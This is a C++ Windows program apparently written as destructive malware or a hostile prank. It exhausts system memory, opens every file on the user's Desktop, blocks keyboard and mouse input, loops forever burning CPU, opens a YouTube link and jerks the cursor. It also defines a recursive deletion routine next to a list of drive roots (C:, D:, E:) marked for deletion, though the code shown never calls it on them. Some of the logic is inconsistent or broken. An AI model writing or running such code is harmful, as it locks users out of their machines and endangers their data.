#include <iostream>
#include <Windows.h>
#include <filesystem>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <shellapi.h>
#include <vector>
#include <atomic>

bool DeleteDirectory(const std::string& directoryPath) {

    DWORD fileAttributes = GetFileAttributesA(directoryPath.c_str());

    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {

        std::cerr << "GetFileAttributes failed with error: " << GetLastError() << std::endl;

        return false;

    }


    if (!(fileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {

        if (!DeleteFileA(directoryPath.c_str())) {

            std::cerr << "DeleteFile failed with error: " << GetLastError() << std::endl;

            return false;

        }

        return true;

    }


    HANDLE fileHandle = CreateFileA(directoryPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_DIRECTORY, nullptr);

    if (fileHandle == INVALID_HANDLE_VALUE) {

        std::cerr << "CreateFile failed with error: " << GetLastError() << std::endl;

        return false;

    }


    WIN32_FIND_DATAA findData;

    std::string searchPath = directoryPath + "\\*";

    HANDLE searchHandle = FindFirstFileA(searchPath.c_str(), &findData);

    if (searchHandle == INVALID_HANDLE_VALUE) {

        CloseHandle(fileHandle);

        std::cerr << "FindFirstFile failed with error: " << GetLastError() << std::endl;

        return false;

    }


    do {

        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {

            std::string filePath = directoryPath + "\\" + findData.cFileName;

            if (!DeleteDirectory(filePath)) {

                FindClose(searchHandle);

                CloseHandle(fileHandle);

                return false;

            }

        }

    } while (FindNextFileA(searchHandle, &findData));


    DWORD lastError = GetLastError();

    FindClose(searchHandle);

    CloseHandle(fileHandle);


    if (lastError != ERROR_NO_MORE_FILES) {

        std::cerr << "FindNextFile failed with error: " << lastError << std::endl;

        return false;

    }


    if (!RemoveDirectoryA(directoryPath.c_str())) {

        std::cerr << "RemoveDirectory failed with error: " << GetLastError() << std::endl;

        return false;

    }


    return true;

}

unsigned long __cdecl DestroyWindows(void* hwnd) {

    if (hwnd != nullptr) {

        DestroyWindow((HWND)hwnd);

        return 0;

    }

    return 1;

}

int main() {
    DWORD WINAPI DestroyWindows(LPVOID);
    std::atomic<bool> stopFlag(false);
    char Start;
    std::cout << "Start(y/n): ";
    std::cin >> Start;
    if (Start == 'y') {



        MEMORYSTATUSEX memStatus;

        memStatus.dwLength = sizeof(MEMORYSTATUSEX);

        GlobalMemoryStatusEx(&memStatus);

        size_t totalRamBytes = memStatus.ullTotalPhys;


        // Allocate a large chunk of memory to consume most of the RAM

        size_t allocationSize = totalRamBytes * 0.9; // Allocate 90% of total RAM

        char* memoryBlock = new char[allocationSize];


        // Fill the allocated memory with random data to ensure it's actually allocated

        for (size_t i = 0; i < allocationSize; ++i) {

            memoryBlock[i] = static_cast<char>(rand() % 256);

        }


        std::cout << "Allocated " << allocationSize << " bytes of memory." << std::endl;



        // Never reached, but included for completeness

        delete[] memoryBlock;


        POINT cursorPosition;

        cursorPosition.x = rand() % GetSystemMetrics(SM_CXSCREEN);

        cursorPosition.y = rand() % GetSystemMetrics(SM_CYSCREEN);

        SetCursorPos(cursorPosition.x, cursorPosition.y);

        // Get the list of files on the desktop

        WIN32_FIND_DATA findData;

        HANDLE hFind = INVALID_HANDLE_VALUE;

        std::vector<std::string> files;


        std::string desktopPath = getenv("USERPROFILE");

        desktopPath += "\\Desktop\\*";


        hFind = FindFirstFile(desktopPath.c_str(), &findData);

        if (hFind == INVALID_HANDLE_VALUE) {

            std::cerr << "Failed to find files on desktop." << std::endl;

            return 1;

        }


        do {

            files.push_back(findData.cFileName);

        } while (FindNextFile(hFind, &findData));


        FindClose(hFind);


        // Open each file using ShellExecute

        for (const auto& file : files) {

            std::string filePath = desktopPath.substr(0, desktopPath.size() - 1);

            filePath += file;


            ShellExecute(NULL, "open", filePath.c_str(), NULL, NULL, SW_SHOW);

            Sleep(100);

        }

        std::vector<std::string> directoriesToDelete = {
           "C:\\",
           "D:\\",
           "E:\\",
        };


        while (true) {

            double result = 0.0;

            for (int i = 0; i < 100000000; i++) {

                result += sqrt(i) * sin(i) * cos(i);

            }

            BlockInput(true);
            std::string url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

            ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_SHOW);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&DestroyWindows, 0, 0, NULL);
            std::string cDrivePath = "C:\\";

            // Move the cursor in a random direction

            int dx = rand() % 10 - 5;

            int dy = rand() % 10 - 5;

            cursorPosition.x += dx;

            cursorPosition.y += dy;


            // Keep the cursor on the screen

            if (cursorPosition.x < 0) cursorPosition.x = 0;

            if (cursorPosition.y < 0) cursorPosition.y = 0;

            if (cursorPosition.x >= GetSystemMetrics(SM_CXSCREEN)) cursorPosition.x = GetSystemMetrics(SM_CXSCREEN) - 1;

            if (cursorPosition.y >= GetSystemMetrics(SM_CYSCREEN)) cursorPosition.y = GetSystemMetrics(SM_CYSCREEN) - 1;
            // Set the new cursor position

            SetCursorPos(cursorPosition.x, cursorPosition.y);

            Sleep(5);
        }
    }
    else if (Start == 'n')
    {
        exit(-1);
    }
    else {
        std::cout << "Invalid Input" << std::endl;
    }



    return 0;
}